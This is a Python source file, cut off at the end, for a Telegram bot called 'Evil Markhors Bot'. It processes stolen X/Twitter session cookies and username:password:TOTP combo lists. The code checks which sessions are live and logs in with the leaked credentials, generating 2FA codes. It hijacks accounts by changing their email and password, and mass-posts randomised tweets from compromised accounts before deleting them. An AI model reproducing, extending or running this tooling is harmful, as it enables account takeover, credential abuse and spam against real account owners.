#!/usr/bin/env python3
"""
Evil Markhors Bot - HARDENED (clean + split + verify + tweet + delete)
"""
import os
import io
import re
import sys
import json
import stat
import hmac
import time
import random
import base64
import struct
import secrets
import string
import asyncio
import logging
import tempfile
import zipfile
import shutil
import traceback

try:
    import httpx
    from telegram import Update, InputFile
    from telegram.error import RetryAfter
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes,
    )
except ImportError:
    print("Deps missing: pip install -r requirements.txt")
    raise

# ============================ CONFIG ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN")
WEBSITE = os.getenv("WEBSITE", "https://evilmarkhors.me")
CREDIT = os.getenv("CREDIT", "Config by Evil Markhors")
LIVE_DEFAULT = os.getenv("LIVE", "1") == "1"
CONCURRENCY = int(os.getenv("CONCURRENCY", "8"))
TIMEOUT = float(os.getenv("TIMEOUT", "25"))
ACC_TIMEOUT = float(os.getenv("ACC_TIMEOUT", "90"))
MAX_FILES = int(os.getenv("MAX_FILES", "5000"))
RETRIES = int(os.getenv("RETRIES", "3"))
TWEET_DELAY = float(os.getenv("TWEET_DELAY", "6"))
TWEET_LIMIT = int(os.getenv("TWEET_LIMIT", "270"))
STORE_PATH = os.getenv("STORE_PATH", "users.json")
HERE = os.path.dirname(os.path.abspath(__file__))
SELF = os.path.basename(os.path.abspath(__file__))
DEL_DIR = os.path.join(HERE, "del_data")

ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "7028523300,6120166351").split(",") if x.strip()}
SPLIT = {}
CTEST = set()
TWEET = {}
KEYMAP = {
    "year": "Year", "followers": "Followers", "friends": "Friends", "posts": "Posts",
    "likes": "Likes", "media": "Media", "verified": "Verified", "card": "Card added",
    "api": "API", "developer api": "Developer API", "protected": "Protected",
    "2fa": "2FA", "country": "Country",
}
NUM_FIELDS = {"year", "followers", "friends", "posts", "likes", "media"}
BOOL_FIELDS = {"verified", "card", "api", "developer api", "protected", "2fa"}

PREFIXES = ["", "", "", "", "Update:", "News:", "Breaking:", "Just in:", "Aaj:", "Note:"]
SUFFIXES = ["", "", "", "", "!", ".", " 🔥", " ✔"]

BEARER = (
    "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
    "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"
)
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

FIELDS = [
    "Status", "Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media", "Verified",
    "Verified type", "Suspended", "Protected", "Country", "Year", "Created", "Email",
    "Phone", "2FA", "Card added", "API", "Developer API",
]
_FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")

# ============================ DEPLOY TEMPLATES ============================
FILES = {
    "requirements.txt": "python-telegram-bot>=21.0\nhttpx>=0.27\n",
    ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\nbatch_*.json\ndel_data/\n",
    ".dockerignore": "venv\n__pycache__\n*.zip\n.env\ndata\nusers.json\n",
    ".env.example": (
        "BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
        "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\nSTORE_PATH=users.json\n"
        "ADMIN_IDS=7028523300,6120166351\n"
    ),
    "Dockerfile": (
        "FROM python:3.12-slim\nWORKDIR /app\n"
        "ENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
        "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
        f"COPY {SELF} bot.py\nCMD [\"python\",\"bot.py\"]\n"
    ),
    "railway.toml": (
        '[build]\nbuilder = "DOCKERFILE"\ndockerfilePath = "Dockerfile"\n\n'
        '[deploy]\nrestartPolicyType = "ON_FAILURE"\nrestartPolicyMaxRetries = 10\n'
    ),
    "README.md": f"# Evil Markhors Bot\n\nCookie + ULP reworker.\n\n```\npython {SELF}\n```\n",
}


def _w(path, content, overwrite=False):
    full = os.path.join(HERE, path)
    if os.path.exists(full) and not overwrite:
        return False
    with open(full, "w", encoding="utf-8") as fh:
        fh.write(content)
    if path.endswith(".sh"):
        os.chmod(full, os.stat(full).st_mode | stat.S_IEXEC)
    return True


def bootstrap(force=False):
    return [n for n, c in FILES.items() if _w(n, c, force)]


# ============================ STATE ============================
_store = {}
_lock = asyncio.Lock()
BATCH = {}
PEND = {}


def load_store():
    global _store
    try:
        with open(os.path.join(HERE, STORE_PATH), encoding="utf-8") as f:
            _store = json.load(f)
    except Exception:
        _store = {}


def save_store():
    try:
        p = os.path.join(HERE, STORE_PATH)
        with open(p + ".tmp", "w", encoding="utf-8") as f:
            json.dump(_store, f, indent=2)
        os.replace(p + ".tmp", p)
    except Exception:
        logging.exception("store save")


def ucfg(uid):
    return _store.setdefault(
        str(uid),
        {"live": LIVE_DEFAULT, "mode": "auto", "takeover": False, "newpass": "", "newemail": ""},
    )


def get_live(uid):
    return bool(ucfg(uid).get("live", LIVE_DEFAULT))


async def set_cfg(uid, **kw):
    async with _lock:
        ucfg(uid).update(kw)
        save_store()


def batch_file(uid):
    return os.path.join(HERE, "batch_" + str(uid) + ".json")


def save_batch(uid):
    b = BATCH.get(uid)
    if not b:
        return
    try:
        with open(batch_file(uid), "w", encoding="utf-8") as f:
            json.dump(
                {
                    "lines": b["lines"],
                    "results": b["results"],
                    "ok": b["ok"],
                    "fail": b["fail"],
                    "mode": b["mode"],
                    "started": b["started"],
                },
                f,
            )
    except Exception:
        logging.exception("save_batch")


def clear_batch_file(uid):
    try:
        os.remove(batch_file(uid))
    except Exception:
        pass


def load_batches():
    for fn in os.listdir(HERE):
        if not (fn.startswith("batch_") and fn.endswith(".json")):
            continue
        try:
            uid = fn[6:-5]
            with open(os.path.join(HERE, fn), encoding="utf-8") as f:
                d = json.load(f)
            if d.get("lines"):
                BATCH[uid] = {
                    "tmp": tempfile.mkdtemp(prefix="em_rec_"),
                    "msg": None,
                    "lines": d["lines"],
                    "results": d.get("results", []),
                    "ok": d.get("ok", 0),
                    "fail": d.get("fail", 0),
                    "mode": d.get("mode", "ulp"),
                    "takeover": False,
                    "newpass": "",
                    "newemail": "",
                    "started": d.get("started", time.time()),
                }
                logging.info("recovered batch for %s (%s lines)", uid, len(d["lines"]))
        except Exception:
            logging.exception("load_batch %s", fn)


# ============================ PROGRESS ============================
def _fmt_t(sec):
    sec = int(sec)
    if sec >= 60:
        return str(sec // 60) + "m" + str(sec % 60).zfill(2) + "s"
    return str(sec) + "s"


async def _edit(msg, text):
    if msg is None:
        return
    for _ in range(3):
        try:
            await msg.edit_text(text)
            return
        except RetryAfter as e:
            await asyncio.sleep(getattr(e, "retry_after", 2))
        except Exception:
            return


class Progress:
    def __init__(self, msg, total, label):
        self.msg = msg
        self.total = total
        self.label = label
        self.done = 0
        self.ok = 0
        self.fail = 0
        self.pend = 0
        self.start = time.time()
        self.last = 0.0
        self.lock = asyncio.Lock()
        self.phase = "start"

    async def update(self, phase=None, force=False):
        if phase:
            self.phase = phase
        async with self.lock:
            now = time.time()
            if not force and now - self.last < 2.5:
                return
            self.last = now
            el = now - self.start
            pct = int(self.done * 100 / self.total) if self.total else 0
            eta = (el / self.done * (self.total - self.done)) if self.done else 0
            bar = "#" * (pct // 5) + "." * (20 - pct // 5)
            text = (
                self.label + "\n" + self.phase + "\n\n" + bar + " " + str(pct) + "%\n"
                + str(self.done) + "/" + str(self.total)
                + " | ok " + str(self.ok) + " | fail " + str(self.fail) + " | code " + str(self.pend)
                + "\nwaqt " + _fmt_t(el) + " | baaqi ~" + _fmt_t(eta)
            )
            await _edit(self.msg, text)


# ============================ COOKIE MODE ============================
def parse_cookie_file(text):
    data = {}
    cookies = []
    for line in text.splitlines():
        m = _FIELD_RE.match(line)
        if m:
            data[m.group(1).strip()] = m.group(2).strip()
        elif "\t" in line and not line.lstrip().startswith("#"):
            cookies.append(line)
    return data, cookies


def cookie_dict(lines):
    d = {}
    for l in lines:
        p = l.split("\t")
        if len(p) >= 7:
            d[p[5]] = p[6]
    return d


def build_cookie_file(data, cookies):
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT, ""]
    for f in FIELDS:
        v = data.get(f)
        out.append("\u2013 " + f + ": " + (v if v not in (None, "") else "\u2013"))
    out.append("\u2013 Cookies: " + CREDIT)
    out.append("")
    out.extend(cookies)
    return "\n".join(out).rstrip() + "\n"


def hdrs(ck):
    return {
        "Authorization": "Bearer " + BEARER,
        "x-csrf-token": ck.get("ct0", ""),
        "x-twitter-active-user": "yes",
        "x-twitter-auth-type": "OAuth2Session" if ck.get("auth_token") else "",
        "x-twitter-client-language": "en",
        "User-Agent": UA,
        "Accept": "application/json",
    }


async def get_json(client, ck, url):
    delay = 1.0
    for _ in range(RETRIES):
        try:
            r = await client.get(url, headers=hdrs(ck), cookies=ck, timeout=TIMEOUT)
            if r.status_code in (429, 500, 502, 503):
                await asyncio.sleep(delay)
                delay *= 2
                continue
            if r.status_code == 200:
                return r.json()
            return None
        except Exception:
            await asyncio.sleep(delay)
            delay *= 2
    return None


def _yr(s):
    m = re.search(r"(19|20)\d{2}", s or "")
    return m.group(0) if m else ""


def norm_country(v):
    v = (v or "").strip()
    if len(v) == 2 and v.isalpha():
        return v.upper()
    return v


async def detect_country(client, ck):
    s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
    if isinstance(s, dict):
        cc = norm_country(s.get("country_code") or "")
        if len(cc) == 2:
            return cc
        tl = s.get("trend_location")
        if isinstance(tl, list) and tl:
            cc = norm_country(tl[0].get("countryCode") or "")
            if len(cc) == 2:
                return cc
            nm = (tl[0].get("country") or "").strip()
            if nm:
                return nm
    j = await get_json(
        client, ck,
        "https://api.x.com/1.1/account/verify_credentials.json?include_entities=false&skip_status=true",
    )
    if isinstance(j, dict):
        loc = (j.get("location") or "").strip()
        if loc:
            return loc
    return ""


async def live_check(client, ck):
    d = {}
    j = await get_json(
        client, ck,
        "https://api.x.com/1.1/account/verify_credentials.json"
        "?include_entities=false&skip_status=true&include_email=true",
    )
    if j:
        d["Status"] = "LIVE"
        d.update({
            "Username": j.get("screen_name", ""),
            "ID": j.get("id_str", ""),
            "Followers": j.get("followers_count", ""),
            "Friends": j.get("friends_count", ""),
            "Posts": j.get("statuses_count", ""),
            "Likes": j.get("favourites_count", ""),
            "Media": j.get("media_count", ""),
            "Verified": str(bool(j.get("verified"))).lower(),
            "Verified type": j.get("verified_type") or "",
            "Suspended": "false",
            "Protected": str(bool(j.get("protected"))).lower(),
            "Email": j.get("email", ""),
        })
        if j.get("created_at"):
            d["Created"] = j["created_at"]
            if _yr(j["created_at"]):
                d["Year"] = _yr(j["created_at"])
        cc = await detect_country(client, ck)
        if cc:
            d["Country"] = cc
    else:
        d["Status"] = "DEAD"
    return d


async def rework_cookie(text, client, live, sem):
    data, cookies = parse_cookie_file(text)
    if live and cookies:
        async with sem:
            try:
                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
            except asyncio.TimeoutError:
                ld = {"Status": "DEAD"}
        for k, v in ld.items():
            if v not in ("", None):
                data[k] = str(v)
    elif cookies:
        data.setdefault("Status", "UNKNOWN")
    data["Cookies"] = CREDIT
    return build_cookie_file(data, cookies)


# ============================ ULP MODULE ============================
ONB = "https://api.twitter.com/1.1/onboarding/task.json"


def totp_now(sec):
    sec = sec.strip().replace(" ", "").upper()
    key = base64.b32decode(sec + "=" * ((8 - len(sec) % 8) % 8))
    h = hmac.new(key, struct.pack(">Q", int(time.time()) // 30), hashlib.sha1).digest()
    o = h[19] & 15
    return str((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000).zfill(6)


def parse_ulp(line):
    parts = [p.strip() for p in line.strip().split(":") if p.strip()]
    if not parts:
        return None
    email = ""
    for p in parts:
        if "@" in p:
            email = p
            break
    totp = ""
    for p in list(parts):
        if p != email and re.fullmatch(r"[A-Z2-7]{16,32}", p):
            totp = p
            parts.remove(p)
            break
    rest = [p for p in parts if p != email]
    if len(rest) >= 2:
        username, password = rest[0], rest[1]
    elif len(rest) == 1:
        username, password = "", rest[0]
    else:
        return None
    if not password:
        return None
    return {"username": username, "email": email, "password": password, "totp": totp}


def gen_pass():
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(13)) + "!x7"


def alias_email(base, username):
    local, _, domain = base.partition("@")
    if domain:
        return local + "+" + (username or "x") + "@" + domain
    return base


def _H(cl):
    return {
        "authorization": "Bearer " + BEARER,
        "content-type": "application/json",
        "user-agent": UA,
        "x-twitter-active-user": "yes",
        "x-twitter-client-language": "en",
        "x-csrf-token": cl.cookies.get("ct0", ""),
        "x-guest-token": cl.cookies.get("guest_token", ""),
        "x-twitter-auth-type": "OAuth2Client" if cl.cookies.get("auth_token") else "",
    }


async def _task(cl, payload, start=False):
    params = {"flow_name": "login"} if start else None
    r = await cl.post(ONB, params=params, json=payload, headers=_H(cl), timeout=TIMEOUT)
    try:
        return r.json()
    except Exception:
        return {}


async def _send(cl, ft, subtask, value):
    payload = {
        "flow_token": ft,
        "subtask_inputs": [{"subtask_id": subtask, "enter_text": {"text": value, "link": "next_link"}}],
    }
    return await _task(cl, payload)


async def _duplication(cl, ft):
    payload = {
        "flow_token": ft,
        "subtask_inputs": [
            {"subtask_id": "AccountDuplicationCheck", "check_logged_in_account": {"link": "AccountDuplicationCheck_false"}}
        ],
    }
    return await _task(cl, payload)


def _logged_in(cl):
    return bool(cl.cookies.get("auth_token") and cl.cookies.get("ct0"))


async def ulp_login(ulp):
    cl = httpx.AsyncClient(follow_redirects=True)
    try:
        r = await cl.post("https://api.twitter.com/1.1/guest/activate.json", headers=_H(cl), timeout=TIMEOUT)
        cl.cookies.set("guest_token", r.json().get("guest_token", ""))
        j = await _task(
            cl,
            {
                "input_flow_data": {
                    "flow_context": {"debug_overrides": {}, "start_location": {"location": "splash_screen"}}
                },
                "subtask_versions": {},
            },
            start=True,
        )
        ft = j.get("flow_token")
        if not ft:
            return cl, False, {}
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginJsInstrumentationSubtask", "js_instrumentation": {"response": "{}", "link": "next_link"}}
        ]})
        ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginEnterUserIdentifierSSO", "settings_list": {"setting_responses": [
                {"key": "user_identifier", "response_data": {"text_data": {"result": ulp["username"] or ulp["email"]}}}
            ], "link": "next_link"}}
        ]})
        ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginEnterPassword", "enter_password": {"password": ulp["password"], "link": "next_link"}}
        ]})
        ft = j.get("flow_token", ft)
        subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        if "LoginTwoFactorAuthChallenge" in subs and ulp.get("totp"):
            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", totp_now(ulp["totp"]))
            ft = j.get("flow_token", ft)
            subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        for s in subs:
            if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
                return cl, False, {"pending": s, "flow_token": ft}
        if "AccountDuplicationCheck" in subs:
            await _duplication(cl, ft)
        return cl, _logged_in(cl), {}
    except Exception:
        logging.exception("ulp_login")
        return cl, False, {}


async def resume_login(st, code):
    cl = st["client"]
    ft = st["flow_token"]
    j = await _send(cl, ft, st["subtask"], code)
    ft = j.get("flow_token", ft)
    subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
    for s in subs:
        if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
            st["subtask"] = s
            st["flow_token"] = ft
            return "more"
    if "AccountDuplicationCheck" in subs:
        await _duplication(cl, ft)
    return "ok" if _logged_in(cl) else "fail"


EMAIL_SET = [
    "https://x.com/i/api/1.1/account/update_email.json",
    "https://api.x.com/1.1/account/update_email.json",
]
EMAIL_CFM = [
    "https://x.com/i/api/1.1/account/confirm_email.json",
    "https://api.x.com/1.1/account/verify_email.json",
]


async def set_email(cl, ck, new_email):
    for url in EMAIL_SET:
        try:
            r = await cl.post(
                url,
                headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
                cookies=ck,
                data={"email": new_email},
                timeout=TIMEOUT,
            )
            if r.status_code == 200:
                return True
        except Exception:
            pass
    return False


async def confirm_email(cl, ck, code):
    for url in EMAIL_CFM:
        for field in ("confirmation_code", "code"):
            try:
                r = await cl.post(
                    url,
                    headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
                    cookies=ck,
                    data={field: code},
                    timeout=TIMEOUT,
                )
                if r.status_code == 200:
                    return True
            except Exception:
                pass
    return False


async def change_pass(cl, ck, old, new):
    try:
        r = await cl.post(
            "https://twitter.com/i/api/i/account/change_password.json",
            headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
            cookies=ck,
            data={"current_password": old, "password": new, "password_confirmation": new},
            timeout=TIMEOUT,
        )
        return r.status_code == 200
    except Exception:
        return False


async def finish_account(uid, idx, ulp, cl):
    b = BATCH[uid]
    ck = dict(cl.cookies)
    try:
        det = await asyncio.wait_for(live_check(cl, ck), ACC_TIMEOUT)
    except asyncio.TimeoutError:
        det = {}
    res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
    if b["takeover"] and b["newemail"]:
        ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
        try:
            if await asyncio.wait_for(set_email(cl, ck, ne), ACC_TIMEOUT):
                res["new_email"] = ne
        except asyncio.TimeoutError:
            pass
        if res.get("new_email"):
            b["results"][idx] = res
            PEND.setdefault(uid, {})[str(idx)] = {
                "kind": "email", "client": cl, "ulp": ulp, "idx": idx, "new_email": ne,
            }
            return "email_pending"
    if b["takeover"]:
        np = b["newpass"] or gen_pass()
        try:
            if await asyncio.wait_for(change_pass(cl, ck, ulp["password"], np), ACC_TIMEOUT):
                res["new_pass"] = np
        except asyncio.TimeoutError:
            pass
    b["results"][idx] = res
    b["ok"] += 1
    await cl.aclose()
    return "done"


def fmt_result(r):
    if not r:
        return ""
    if not r.get("ok"):
        return "== FAIL ==\n" + str(r.get("line", "")) + "\nError: " + str(r.get("err", "")) + "\n"
    u = r["ulp"]
    d = r["details"]
    o = [
        "Login: OK",
        "Username: " + str(d.get("Username", "")),
        "ID: " + str(d.get("ID", "")),
        "Email: " + str(d.get("Email", "") or u.get("email", "")),
        "Password: " + u["password"],
        "2FA: " + (u.get("totp", "") or "\u2013"),
    ]
    if r.get("new_pass"):
        o.append("New password: " + r["new_pass"])
    if r.get("new_email"):
        o.append("New email: " + r["new_email"])
    if r.get("pending"):
        o.append("STATUS: " + r["pending"])
    for k in ("Followers", "Friends", "Posts", "Likes", "Media", "Verified", "Verified type",
              "Suspended", "Protected", "Country", "Year", "Created", "Phone", "Card added",
              "API", "Developer API"):
        o.append(k + ": " + str(d.get(k, "") or "\u2013"))
    o.append(CREDIT)
    o.append(WEBSITE)
    o.append("")
    return "\n".join(o)


# ============================ ADMIN HELPERS ============================
def is_admin(uid):
    try:
        return int(uid) in ADMIN_IDS
    except Exception:
        return False


def parse_buckets(spec):
    out = []
    for part in spec.split(","):
        p = part.strip()
        if not p:
            continue
        if p.endswith("+") and p[:-1].strip().isdigit():
            out.append((p, int(p[:-1]), None, None))
        elif "-" in p and p.replace("-", "").isdigit():
            lo, hi = p.split("-", 1)
            out.append((p, int(lo), int(hi), None))
        else:
            out.append((p, None, None, p.lower()))
    return out


def bucket_for(val, buckets, is_num):
    if is_num:
        try:
            n = int(str(val).strip())
        except Exception:
            return None
        for label, lo, hi, _ in buckets:
            if lo is not None and hi is not None and lo <= n <= hi:
                return label
            if lo is not None and hi is None and n >= lo:
                return label
        return None
    v = (val or "").strip().lower()
    for label, _, _, exact in buckets:
        if exact is not None and v == exact:
            return label
    return None


def norm_bool(v):
    v = (v or "").strip().lower()
    if v in ("true", "yes", "1"):
        return "yes"
    if v in ("false", "no", "0"):
        return "no"
    return v


def field_value(data, field):
    return str(data.get(KEYMAP[field], "") or "").strip()


# ============================ TWEET HELPERS ============================
def split_text(text, limit=TWEET_LIMIT):
    text = (text or "").strip()
    if not text:
        return [""]
    parts = []
    cur = ""
    for word in text.split():
        if len(cur) + len(word) + 1 > limit:
            if cur:
                parts.append(cur)
            cur = word
            while len(cur) > limit:
                parts.append(cur[:limit])
                cur = cur[limit:]
        else:
            cur = (cur + " " + word).strip()
    if cur:
        parts.append(cur)
    if len(parts) > 1:
        n = len(parts)
        parts = [p + " (" + str(i + 1) + "/" + str(n) + ")" for i, p in enumerate(parts)]
    return parts or [""]


def randomize(text):
    t = (text or "").strip()
    tags = re.findall(r"#[\w\u0600-\u06FF]+", t)
    if tags:
        for tag in tags:
            t = t.replace(tag, "", 1)
        t = re.sub(r"\s+", " ", t).strip()
    pre = random.choice(PREFIXES)
    suf = random.choice(SUFFIXES)
    if pre:
        t = pre + " " + t
    if tags:
        random.shuffle(tags)
        t = (t + " " + " ".join(tags)).strip()
    return (t + suf).strip()


def _uh(ck):
    return {
        "Authorization": "Bearer " + BEARER,
        "x-csrf-token": ck.get("ct0", ""),
        "x-twitter-active-user": "yes",
        "x-twitter-auth-type": "OAuth2Session",
        "User-Agent": UA,
    }


async def upload_media(client, ck, path, mime, category):
    url = "https://upload.twitter.com/i/media/upload.json"
    size = os.path.getsize(path)
    r = await client.post(
        url,
        params={"command": "INIT", "media_type": mime, "total_bytes": size, "media_category": category},
        headers=_uh(ck), cookies=ck, timeout=TIMEOUT,
    )
    if r.status_code != 200:
        return None
    mid = r.json().get("media_id")
    if not mid:
        return None
    with open(path, "rb") as f:
        idx = 0
        while True:
            chunk = f.read(2 * 1024 * 1024)
            if not chunk:
                break
            rr = await client.post(
                url,
                params={"command": "APPEND", "media_id": mid, "segment_index": idx},
                headers=_uh(ck), cookies=ck, files={"media": chunk}, timeout=TIMEOUT,
            )
            if rr.status_code >= 400:
                return None
            idx += 1
    r = await client.post(
        url, params={"command": "FINALIZE", "media_id": mid},
        headers=_uh(ck), cookies=ck, timeout=TIMEOUT,
    )
    if r.status_code >= 400:
        return None
    info = {}
    try:
        info = r.json().get("processing_info") or {}
    except Exception:
        info = {}
    while info:
        st = info.get("state")
        if st == "succeeded":
            break
        if st == "failed":
            return None
        await asyncio.sleep(info.get("check_after_secs", 2))
        rr = await client.get(
            url, params={"command": "STATUS", "media_id": mid},
            headers=_uh(ck), cookies=ck, timeout=TIMEOUT,
        )
        try:
            info = rr.json().get("processing_info") or {}
        except Exception:
            info = {}
    return mid


async def post_tweet(client, ck, text, media):
    ids = []
    reply = None
    parts = split_text(text)
    for i, part in enumerate(parts):
        data = {"tweet_mode": "extended"}
        if part:
            data["status"] = part
        if reply:
            data["in_reply_to_status_id"] = reply
        if i == 0 and media:
            mid = await upload_media(client, ck, media["path"], media["mime"], media["category"])
            if mid:
                data["media_ids"] = str(mid)
        r = await client.post(
            "https://api.x.com/1.1/statuses/update.json",
            headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
            cookies=ck, data=data, timeout=TIMEOUT,
        )
        if r.status_code != 200:
            return ids, r.status_code
        try:
            reply = r.json().get("id_str")
        except Exception:
            reply = None
        if reply:
            ids.append(reply)
        await asyncio.sleep(1.5)
    return ids, 200


async def run_tweet_batch(u, doc):
    uid = str(u.effective_user.id)
    t = TWEET[uid]
    tmp = tempfile.mkdtemp(prefix="tw_")
    ip = os.path.join(tmp, "in.zip")
    msg = await u.message.reply_text("Download...")
    posted = []
    links = []
    failed = []
    saved = []
    batch_id = str(int(time.time()))
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog = Progress(msg, len(names), "TWEET")
            prog.phase = "Posting"
            filt = t.get("filter") or []
            variants = t.get("variants") or [""]
            async with httpx.AsyncClient(follow_redirects=True) as client:
                for name in names:
                    try:
                        raw = zin.read(name).decode("utf-8", "ignore")
                        data, cookies = parse_cookie_file(raw)
                        ck = cookie_dict(cookies)
                        if not ck:
                            failed.append(name + " | no cookies")
                            prog.fail += 1
                            prog.done += 1
                            await prog.update()
                            continue
                        if filt:
                            cc = await asyncio.wait_for(detect_country(client, ck), ACC_TIMEOUT)
                            if norm_country(cc) not in filt:
                                prog.done += 1
                                await prog.update()
                                continue
                        body = randomize(random.choice(variants))
                        ids, code = await post_tweet(client, ck, body, t.get("media"))
                        uname = data.get("Username", "") or name
                        if code == 200 and ids:
                            link = "https://x.com/i/status/" + ids[0]
                            posted.append(uname + " -> " + link)
                            links.append(uname + " | " + link)
                            saved.append({"username": uname, "ids": ids, "cookies": cookies})
                            prog.ok += 1
                        else:
                            failed.append(uname + " | http " + str(code))
                            prog.fail += 1
                    except Exception as e:
                        logging.exception("tweet %s", name)
                        failed.append(name + " | " + str(e))
                        prog.fail += 1
                    prog.done += 1
                    await prog.update()
                    await asyncio.sleep(TWEET_DELAY)
        if saved:
            os.makedirs(DEL_DIR, exist_ok=True)
            with open(os.path.join(DEL_DIR, uid + "_" + batch_id + ".json"), "w", encoding="utf-8") as f:
                json.dump(saved, f)
        op = os.path.join(tmp, "out.zip")
        with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("links.txt", "\n".join(links))
            z.writestr("failed.txt", "\n".join(failed))
            z.writestr("summary.txt", "posted: " + str(len(links)) + "\nfailed: " + str(len(failed))
                       + "\nbatch_id: " + batch_id)
        await _send_zip(u, op, "evilmarkhors_tweet.zip",
                        "Done | posted " + str(len(links)) + " | fail " + str(len(failed))
                        + "\nbatch id: " + batch_id + "\nDelete: /delbatch " + batch_id)
        if links:
            chunk = ""
            for line in links:
                if len(chunk) + len(line) > 3500:
                    await u.message.reply_text(chunk)
                    chunk = ""
                chunk += line + "\n"
            if chunk:
                await u.message.reply_text(chunk)
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("tweet batch")
        await _edit(msg, "Error: " + str(e))
    finally:
        TWEET.pop(uid, None)
        shutil.rmtree(tmp, ignore_errors=True)


async def delete_ids(client, ck, ids):
    done = 0
    for tid in reversed(ids):
        try:
            r = await client.post(
                "https://api.x.com/1.1/statuses/destroy/" + str(tid) + ".json",
                headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
                cookies=ck, data={"id": str(tid)}, timeout=TIMEOUT,
            )
            if r.status_code == 200:
                done += 1
        except Exception:
            pass
        await asyncio.sleep(1.0)
    return done


async def del_batch(uid, u, bid):
    path = os.path.join(DEL_DIR, uid + "_" + bid + ".json")
    if not os.path.exists(path):
        await u.message.reply_text("Ye batch nahi mila: " + bid)
        return
    with open(path, encoding="utf-8") as f:
        items = json.load(f)
    msg = await u.message.reply_text("Deleting " + str(len(items)) + " accounts...")
    deleted = 0
    fail = 0
    async with httpx.AsyncClient(follow_redirects=True) as client:
        for it in items:
            ck = cookie_dict(it.get("cookies") or [])
            if not ck:
                fail += 1
                continue
            n = await delete_ids(client, ck, it.get("ids") or [])
            deleted += n
            if n == 0:
                fail += 1
            await asyncio.sleep(2)
    await _edit(msg, "Delete done | tweets deleted " + str(deleted) + " | accounts fail " + str(fail))


# ============================ RUNNERS ============================
async def process_cookie_zip(ip, op, live, prog):
    sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as zout:
                for name in names:
                    raw = b""
                    try:
                        raw = zin.read(name)
                        out = await rework_cookie(raw.decode("utf-8", "ignore"), client, live, sem)
                        zout.writestr(name, out)
                        prog.ok += 1
                    except Exception:
                        logging.exception("cookie %s", name)
                        try:
                            zout.writestr(name, raw)
                        except Exception:
                            pass
                        prog.fail += 1
                    prog.done += 1
                    await prog.update()
    return prog.ok, prog.fail, prog.total


async def process_verify(ip, op, live, prog):
    sem = asyncio.Semaphore(CONCURRENCY)
    working = []
    dead = []
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            for name in names:
                try:
                    text = zin.read(name).decode("utf-8", "ignore")
                    data, cookies = parse_cookie_file(text)
                    ok = False
                    if cookies:
                        async with sem:
                            try:
                                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
                            except asyncio.TimeoutError:
                                ld = {"Status": "DEAD"}
                        for k, v in ld.items():
                            if v not in ("", None):
                                data[k] = str(v)
                        ok = data.get("Status") == "LIVE"
                    else:
                        data["Status"] = "DEAD"
                    if ok:
                        working.append((name, build_cookie_file(data, cookies)))
                        prog.ok += 1
                    else:
                        data["Status"] = "DEAD"
                        dead.append((name, build_cookie_file(data, cookies)))
                        prog.fail += 1
                except Exception:
                    logging.exception("verify %s", name)
                    prog.fail += 1
                prog.done += 1
                await prog.update()
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        for name, out in working:
